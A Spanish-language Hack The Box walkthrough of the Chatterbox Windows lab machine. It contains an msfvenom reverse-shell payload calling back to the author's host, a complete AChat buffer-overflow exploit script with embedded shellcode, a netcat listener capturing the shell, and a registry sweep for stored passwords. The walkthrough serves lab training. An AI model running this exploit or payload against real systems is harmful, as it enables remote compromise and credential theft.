---
title: Hack The Box Chatterbox
author: k4miyo
date: 2021-11-26
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Windows]
tags: [Powershell]
ping: true
---

## Chatterbox
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.74.

```bash
❯ ping -c 1 10.10.10.74
PING 10.10.10.74 (10.10.10.74) 56(84) bytes of data.
64 bytes from 10.10.10.74: icmp_seq=1 ttl=127 time=137 ms

--- 10.10.10.74 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.640/136.640/136.640/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.74 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 21:33 CST
Initiating SYN Stealth Scan at 21:33
Scanning 10.10.10.74 [65535 ports]
Discovered open port 9256/tcp on 10.10.10.74
Discovered open port 9255/tcp on 10.10.10.74
Completed SYN Stealth Scan at 21:33, 26.46s elapsed (65535 total ports)
Nmap scan report for 10.10.10.74
Host is up, received user-set (0.14s latency).
Scanned at 2021-11-19 21:33:22 CST for 27s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
9255/tcp open  mon     syn-ack ttl 127
9256/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
           Raw packets sent: 131080 (5.768MB) | Rcvd: 14 (616B)
```

En caso de que nuestro escaneo no nos reporte algún puerto abierto, podríamos utilizar la herramienta [fastTCPScan](https://s4vitar.github.io/fasttcpscan-go/) desarrollada por ***S4vitar*** o crearnos un script sencillo como [portScan](/portScan).

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.74
   5   │     [*] Open ports: 9255,9256
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p9255,9256 10.10.10.74 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 21:35 CST
Nmap scan report for 10.10.10.74
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat   AChat chat system

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
```

Vemos el peurto 9255 que presenta el servicio HTTP, así que antes de abrir del navegador, vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.10.74:9255/
ERROR Opening: http://10.10.10.74:9255/ - Can't convert to UTF-8 undefined method `force_encoding' for nil:NilClass
```

En este caso vemos un error y si tratamos de ver el contenido vía web, no vamos a poder; asi que poco podemos hacer. Recordamos que tenemos que tenemos otro puerto abierto 9256 con la aplicación ***AChat*** que investigando un poco vemos que se trata de una herramienta para mensajería en redes locales. Vamos a buscar si existen exploits públicos relacionados a dicha herramienta:

```bash
❯ searchsploit achat
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                     | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                        | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                           | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                             | php/webapps/24647.txt
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Tenemos uno en concreto que podemos utilizar `windows/remote/36025.py`; así que vamos a descargalo a nuestro directorio de trabajo y echarle un ojo a ver de que trata.

```bash
❯ searchsploit -m windows/remote/36025.py
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /home/k4miyo/Documentos/HTB/Chatterbox/exploits/36025.py


❯ mv 36025.py achat_rce.py
```

Vemos que es necesario general un payload, así que lo creamos con nuestros parámetros:

```bash
❯ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x
81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa
1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1
\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\
xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRe
gister=EAX -f python                                            
Found 1 compatible encoders                                     
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)       
x86/unicode_mixed chosen with final size 774                  
Payload size: 774 bytes                                         
Final size of python file: 3767 bytes
buf =  b""                                                                                                                       
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"                                                                   
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x48\x68\x32\x62"
buf += b"\x6d\x30\x59\x70\x49\x70\x71\x50\x54\x49\x39\x55\x4d"
buf += b"\x61\x49\x30\x70\x64\x34\x4b\x62\x30\x6e\x50\x32\x6b"
buf += b"\x52\x32\x4c\x4c\x72\x6b\x71\x42\x6e\x34\x52\x6b\x53"
buf += b"\x42\x4e\x48\x6c\x4f\x64\x77\x6d\x7a\x6e\x46\x6c\x71"
buf += b"\x79\x6f\x56\x4c\x6d\x6c\x6f\x71\x71\x6c\x4d\x32\x6c"
buf += b"\x6c\x6d\x50\x57\x51\x38\x4f\x4a\x6d\x4d\x31\x59\x37"
buf += b"\x4b\x32\x78\x72\x70\x52\x42\x37\x52\x6b\x62\x32\x6a"
buf += b"\x70\x32\x6b\x6e\x6a\x6f\x4c\x74\x4b\x30\x4c\x6a\x71"
buf += b"\x73\x48\x67\x73\x4f\x58\x59\x71\x6a\x31\x6f\x61\x72"
buf += b"\x6b\x4e\x79\x6d\x50\x5a\x61\x47\x63\x74\x4b\x70\x49"
buf += b"\x6b\x68\x48\x63\x4e\x5a\x70\x49\x54\x4b\x6d\x64\x52"
buf += b"\x6b\x49\x71\x79\x46\x4e\x51\x6b\x4f\x76\x4c\x56\x61"
buf += b"\x68\x4f\x4a\x6d\x4d\x31\x37\x57\x6e\x58\x57\x70\x42"
buf += b"\x55\x48\x76\x69\x73\x43\x4d\x38\x78\x4f\x4b\x71\x6d"
buf += b"\x4d\x54\x30\x75\x69\x54\x4e\x78\x62\x6b\x52\x38\x4e"
buf += b"\x44\x6d\x31\x38\x53\x31\x56\x34\x4b\x5a\x6c\x4e\x6b"
buf += b"\x62\x6b\x4e\x78\x6b\x6c\x5a\x61\x48\x53\x74\x4b\x39"
buf += b"\x74\x32\x6b\x79\x71\x48\x50\x73\x59\x6f\x54\x4e\x44"
buf += b"\x4f\x34\x4f\x6b\x51\x4b\x53\x31\x51\x49\x31\x4a\x72"
buf += b"\x31\x39\x6f\x39\x50\x51\x4f\x6f\x6f\x50\x5a\x42\x6b"
buf += b"\x5a\x72\x58\x6b\x42\x6d\x4f\x6d\x61\x58\x6c\x73\x4c"
buf += b"\x72\x59\x70\x4d\x30\x31\x58\x51\x67\x54\x33\x50\x32"
buf += b"\x71\x4f\x71\x44\x30\x68\x4e\x6c\x72\x57\x4c\x66\x79"
buf += b"\x77\x6b\x4f\x5a\x35\x68\x38\x46\x30\x4d\x31\x6d\x30"
buf += b"\x39\x70\x6f\x39\x37\x54\x62\x34\x62\x30\x52\x48\x6c"
buf += b"\x69\x31\x70\x42\x4b\x79\x70\x59\x6f\x58\x55\x30\x50"
buf += b"\x72\x30\x42\x30\x72\x30\x71\x30\x42\x30\x6d\x70\x32"
buf += b"\x30\x32\x48\x77\x7a\x5a\x6f\x47\x6f\x6b\x30\x79\x6f"
buf += b"\x4a\x35\x53\x67\x51\x5a\x6b\x55\x72\x48\x6a\x6a\x4a"
buf += b"\x6a\x5a\x6e\x6b\x6b\x51\x58\x6c\x42\x39\x70\x7a\x61"
buf += b"\x57\x4b\x71\x79\x57\x76\x62\x4a\x7a\x70\x70\x56\x62"
buf += b"\x37\x62\x48\x64\x59\x56\x45\x31\x64\x50\x61\x59\x6f"
buf += b"\x46\x75\x54\x45\x47\x50\x34\x34\x6c\x4c\x39\x6f\x50"
buf += b"\x4e\x39\x78\x62\x55\x78\x6c\x61\x58\x68\x70\x37\x45"
buf += b"\x33\x72\x30\x56\x4b\x4f\x5a\x35\x33\x38\x30\x63\x52"
buf += b"\x4d\x42\x44\x4b\x50\x64\x49\x58\x63\x70\x57\x4f\x67"
buf += b"\x62\x37\x6d\x61\x68\x76\x42\x4a\x6e\x32\x31\x49\x4e"
buf += b"\x76\x57\x72\x49\x6d\x4f\x76\x59\x37\x50\x44\x6e\x44"
buf += b"\x4d\x6c\x59\x71\x5a\x61\x52\x6d\x30\x44\x6c\x64\x4a"
buf += b"\x70\x75\x76\x69\x70\x6f\x54\x30\x54\x70\x50\x30\x56"
buf += b"\x62\x36\x6f\x66\x4d\x76\x32\x36\x50\x4e\x50\x56\x6f"
buf += b"\x66\x31\x43\x71\x46\x31\x58\x70\x79\x56\x6c\x4f\x4f"
buf += b"\x75\x36\x59\x6f\x79\x45\x53\x59\x6b\x30\x50\x4e\x50"
buf += b"\x56\x4e\x66\x49\x6f\x70\x30\x43\x38\x69\x78\x61\x77"
buf += b"\x6d\x4d\x4f\x70\x39\x6f\x78\x55\x57\x4b\x58\x70\x74"
buf += b"\x75\x35\x52\x4e\x76\x33\x38\x64\x66\x65\x45\x35\x6d"
buf += b"\x45\x4d\x4b\x4f\x67\x65\x6f\x4c\x6a\x66\x71\x6c\x5a"
buf += b"\x6a\x73\x50\x49\x6b\x69\x50\x61\x65\x4a\x65\x77\x4b"
buf += b"\x6e\x67\x4e\x33\x64\x32\x62\x4f\x31\x5a\x49\x70\x71"
buf += b"\x43\x59\x6f\x37\x65\x41\x41"
```

Debido a que el exploit está en python 2, debemos de quitar el caracter `b` de nuestro shellcode:

```bash
❯ cat shellcode | sed 's/b\"/\"/'                            
buf =  ""                                                       
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x48\x68\x32\x62"
buf += "\x6d\x30\x59\x70\x49\x70\x71\x50\x54\x49\x39\x55\x4d"
buf += "\x61\x49\x30\x70\x64\x34\x4b\x62\x30\x6e\x50\x32\x6b"
buf += "\x52\x32\x4c\x4c\x72\x6b\x71\x42\x6e\x34\x52\x6b\x53"
buf += "\x42\x4e\x48\x6c\x4f\x64\x77\x6d\x7a\x6e\x46\x6c\x71"
buf += "\x79\x6f\x56\x4c\x6d\x6c\x6f\x71\x71\x6c\x4d\x32\x6c"
buf += "\x6c\x6d\x50\x57\x51\x38\x4f\x4a\x6d\x4d\x31\x59\x37"
buf += "\x4b\x32\x78\x72\x70\x52\x42\x37\x52\x6b\x62\x32\x6a"
buf += "\x70\x32\x6b\x6e\x6a\x6f\x4c\x74\x4b\x30\x4c\x6a\x71"
buf += "\x73\x48\x67\x73\x4f\x58\x59\x71\x6a\x31\x6f\x61\x72"
buf += "\x6b\x4e\x79\x6d\x50\x5a\x61\x47\x63\x74\x4b\x70\x49"
buf += "\x6b\x68\x48\x63\x4e\x5a\x70\x49\x54\x4b\x6d\x64\x52"
buf += "\x6b\x49\x71\x79\x46\x4e\x51\x6b\x4f\x76\x4c\x56\x61"
buf += "\x68\x4f\x4a\x6d\x4d\x31\x37\x57\x6e\x58\x57\x70\x42"
buf += "\x55\x48\x76\x69\x73\x43\x4d\x38\x78\x4f\x4b\x71\x6d"
buf += "\x4d\x54\x30\x75\x69\x54\x4e\x78\x62\x6b\x52\x38\x4e"
buf += "\x44\x6d\x31\x38\x53\x31\x56\x34\x4b\x5a\x6c\x4e\x6b"
buf += "\x62\x6b\x4e\x78\x6b\x6c\x5a\x61\x48\x53\x74\x4b\x39"
buf += "\x74\x32\x6b\x79\x71\x48\x50\x73\x59\x6f\x54\x4e\x44"
buf += "\x4f\x34\x4f\x6b\x51\x4b\x53\x31\x51\x49\x31\x4a\x72"
buf += "\x31\x39\x6f\x39\x50\x51\x4f\x6f\x6f\x50\x5a\x42\x6b"
buf += "\x5a\x72\x58\x6b\x42\x6d\x4f\x6d\x61\x58\x6c\x73\x4c"
buf += "\x72\x59\x70\x4d\x30\x31\x58\x51\x67\x54\x33\x50\x32"
buf += "\x71\x4f\x71\x44\x30\x68\x4e\x6c\x72\x57\x4c\x66\x79"
buf += "\x77\x6b\x4f\x5a\x35\x68\x38\x46\x30\x4d\x31\x6d\x30"
buf += "\x39\x70\x6f\x39\x37\x54\x62\x34\x62\x30\x52\x48\x6c"
buf += "\x69\x31\x70\x42\x4b\x79\x70\x59\x6f\x58\x55\x30\x50"
buf += "\x72\x30\x42\x30\x72\x30\x71\x30\x42\x30\x6d\x70\x32"
buf += "\x30\x32\x48\x77\x7a\x5a\x6f\x47\x6f\x6b\x30\x79\x6f"
buf += "\x4a\x35\x53\x67\x51\x5a\x6b\x55\x72\x48\x6a\x6a\x4a"
buf += "\x6a\x5a\x6e\x6b\x6b\x51\x58\x6c\x42\x39\x70\x7a\x61"
buf += "\x57\x4b\x71\x79\x57\x76\x62\x4a\x7a\x70\x70\x56\x62"
buf += "\x37\x62\x48\x64\x59\x56\x45\x31\x64\x50\x61\x59\x6f"
buf += "\x46\x75\x54\x45\x47\x50\x34\x34\x6c\x4c\x39\x6f\x50"
buf += "\x4e\x39\x78\x62\x55\x78\x6c\x61\x58\x68\x70\x37\x45"
buf += "\x33\x72\x30\x56\x4b\x4f\x5a\x35\x33\x38\x30\x63\x52"
buf += "\x4d\x42\x44\x4b\x50\x64\x49\x58\x63\x70\x57\x4f\x67"
buf += "\x62\x37\x6d\x61\x68\x76\x42\x4a\x6e\x32\x31\x49\x4e"
buf += "\x76\x57\x72\x49\x6d\x4f\x76\x59\x37\x50\x44\x6e\x44"
buf += "\x4d\x6c\x59\x71\x5a\x61\x52\x6d\x30\x44\x6c\x64\x4a"
buf += "\x70\x75\x76\x69\x70\x6f\x54\x30\x54\x70\x50\x30\x56"
buf += "\x62\x36\x6f\x66\x4d\x76\x32\x36\x50\x4e\x50\x56\x6f"
buf += "\x66\x31\x43\x71\x46\x31\x58\x70\x79\x56\x6c\x4f\x4f"
buf += "\x75\x36\x59\x6f\x79\x45\x53\x59\x6b\x30\x50\x4e\x50"
buf += "\x56\x4e\x66\x49\x6f\x70\x30\x43\x38\x69\x78\x61\x77"
buf += "\x6d\x4d\x4f\x70\x39\x6f\x78\x55\x57\x4b\x58\x70\x74"
buf += "\x75\x35\x52\x4e\x76\x33\x38\x64\x66\x65\x45\x35\x6d"
buf += "\x45\x4d\x4b\x4f\x67\x65\x6f\x4c\x6a\x66\x71\x6c\x5a"
buf += "\x6a\x73\x50\x49\x6b\x69\x50\x61\x65\x4a\x65\x77\x4b"
buf += "\x6e\x67\x4e\x33\x64\x32\x62\x4f\x31\x5a\x49\x70\x71"
buf += "\x43\x59\x6f\x37\x65\x41\x41"
```

Y ahora si introducimos nuestro shellcode en el exploit y cambiamos la dirección IP por la 10.10.10.74; por lo que nos quedaría asi:

```python
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x48\x68\x32\x62"
buf += "\x6d\x30\x59\x70\x49\x70\x71\x50\x54\x49\x39\x55\x4d"
buf += "\x61\x49\x30\x70\x64\x34\x4b\x62\x30\x6e\x50\x32\x6b"
buf += "\x52\x32\x4c\x4c\x72\x6b\x71\x42\x6e\x34\x52\x6b\x53"
buf += "\x42\x4e\x48\x6c\x4f\x64\x77\x6d\x7a\x6e\x46\x6c\x71"
buf += "\x79\x6f\x56\x4c\x6d\x6c\x6f\x71\x71\x6c\x4d\x32\x6c"
buf += "\x6c\x6d\x50\x57\x51\x38\x4f\x4a\x6d\x4d\x31\x59\x37"
buf += "\x4b\x32\x78\x72\x70\x52\x42\x37\x52\x6b\x62\x32\x6a"
buf += "\x70\x32\x6b\x6e\x6a\x6f\x4c\x74\x4b\x30\x4c\x6a\x71"
buf += "\x73\x48\x67\x73\x4f\x58\x59\x71\x6a\x31\x6f\x61\x72"
buf += "\x6b\x4e\x79\x6d\x50\x5a\x61\x47\x63\x74\x4b\x70\x49"
buf += "\x6b\x68\x48\x63\x4e\x5a\x70\x49\x54\x4b\x6d\x64\x52"
buf += "\x6b\x49\x71\x79\x46\x4e\x51\x6b\x4f\x76\x4c\x56\x61"
buf += "\x68\x4f\x4a\x6d\x4d\x31\x37\x57\x6e\x58\x57\x70\x42"
buf += "\x55\x48\x76\x69\x73\x43\x4d\x38\x78\x4f\x4b\x71\x6d"
buf += "\x4d\x54\x30\x75\x69\x54\x4e\x78\x62\x6b\x52\x38\x4e"
buf += "\x44\x6d\x31\x38\x53\x31\x56\x34\x4b\x5a\x6c\x4e\x6b"
buf += "\x62\x6b\x4e\x78\x6b\x6c\x5a\x61\x48\x53\x74\x4b\x39"
buf += "\x74\x32\x6b\x79\x71\x48\x50\x73\x59\x6f\x54\x4e\x44"
buf += "\x4f\x34\x4f\x6b\x51\x4b\x53\x31\x51\x49\x31\x4a\x72"
buf += "\x31\x39\x6f\x39\x50\x51\x4f\x6f\x6f\x50\x5a\x42\x6b"
buf += "\x5a\x72\x58\x6b\x42\x6d\x4f\x6d\x61\x58\x6c\x73\x4c"
buf += "\x72\x59\x70\x4d\x30\x31\x58\x51\x67\x54\x33\x50\x32"
buf += "\x71\x4f\x71\x44\x30\x68\x4e\x6c\x72\x57\x4c\x66\x79"
buf += "\x77\x6b\x4f\x5a\x35\x68\x38\x46\x30\x4d\x31\x6d\x30"
buf += "\x39\x70\x6f\x39\x37\x54\x62\x34\x62\x30\x52\x48\x6c"
buf += "\x69\x31\x70\x42\x4b\x79\x70\x59\x6f\x58\x55\x30\x50"
buf += "\x72\x30\x42\x30\x72\x30\x71\x30\x42\x30\x6d\x70\x32"
buf += "\x30\x32\x48\x77\x7a\x5a\x6f\x47\x6f\x6b\x30\x79\x6f"
buf += "\x4a\x35\x53\x67\x51\x5a\x6b\x55\x72\x48\x6a\x6a\x4a"
buf += "\x6a\x5a\x6e\x6b\x6b\x51\x58\x6c\x42\x39\x70\x7a\x61"
buf += "\x57\x4b\x71\x79\x57\x76\x62\x4a\x7a\x70\x70\x56\x62"
buf += "\x37\x62\x48\x64\x59\x56\x45\x31\x64\x50\x61\x59\x6f"
buf += "\x46\x75\x54\x45\x47\x50\x34\x34\x6c\x4c\x39\x6f\x50"
buf += "\x4e\x39\x78\x62\x55\x78\x6c\x61\x58\x68\x70\x37\x45"
buf += "\x33\x72\x30\x56\x4b\x4f\x5a\x35\x33\x38\x30\x63\x52"
buf += "\x4d\x42\x44\x4b\x50\x64\x49\x58\x63\x70\x57\x4f\x67"
buf += "\x62\x37\x6d\x61\x68\x76\x42\x4a\x6e\x32\x31\x49\x4e"
buf += "\x76\x57\x72\x49\x6d\x4f\x76\x59\x37\x50\x44\x6e\x44"
buf += "\x4d\x6c\x59\x71\x5a\x61\x52\x6d\x30\x44\x6c\x64\x4a"
buf += "\x70\x75\x76\x69\x70\x6f\x54\x30\x54\x70\x50\x30\x56"
buf += "\x62\x36\x6f\x66\x4d\x76\x32\x36\x50\x4e\x50\x56\x6f"
buf += "\x66\x31\x43\x71\x46\x31\x58\x70\x79\x56\x6c\x4f\x4f"
buf += "\x75\x36\x59\x6f\x79\x45\x53\x59\x6b\x30\x50\x4e\x50"
buf += "\x56\x4e\x66\x49\x6f\x70\x30\x43\x38\x69\x78\x61\x77"
buf += "\x6d\x4d\x4f\x70\x39\x6f\x78\x55\x57\x4b\x58\x70\x74"
buf += "\x75\x35\x52\x4e\x76\x33\x38\x64\x66\x65\x45\x35\x6d"
buf += "\x45\x4d\x4b\x4f\x67\x65\x6f\x4c\x6a\x66\x71\x6c\x5a"
buf += "\x6a\x73\x50\x49\x6b\x69\x50\x61\x65\x4a\x65\x77\x4b"
buf += "\x6e\x67\x4e\x33\x64\x32\x62\x4f\x31\x5a\x49\x70\x71"
buf += "\x43\x59\x6f\x37\x65\x41\x41"

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()

```

Nos ponemos en escucha por el puerto 443 y ejecutamos el exploit:

```bash
❯ python2 achat_rce.py
---->{P00F}!
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.74] 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
chatterbox\alfred
C:\Windows\system32>
```

A este punto ya nos encontramos como el usuario **alfred** y podemos visualizar la flag (user.txt). Ahora nos falta escalar privilegios, por lo que vamos a enumerar un poco el sistema.

```bash
C:\Users\Alfred\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\Alfred\Desktop> reg query HKLM /f password /t REG_SZ /s                                                                                          
                                                                
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1                                                                                  
                                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword                                                                                                                    
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}     
    (Default)    REG_SZ    PasswordProvider
                                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer
                                                                                                                                 HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7be73787-ce71-4b33-b4c8-00d32b54bea8}
    (Default)    REG_SZ    HomeGroup Password

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell  
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer                                                                    
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}    
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest
    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask

